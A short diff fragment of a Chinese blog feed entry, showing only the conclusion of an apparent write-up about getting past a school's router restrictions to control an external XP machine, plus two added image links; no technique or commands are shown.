-<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181129_87n6je_6771.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
+<h3 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h3><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
       
         
     </entry>
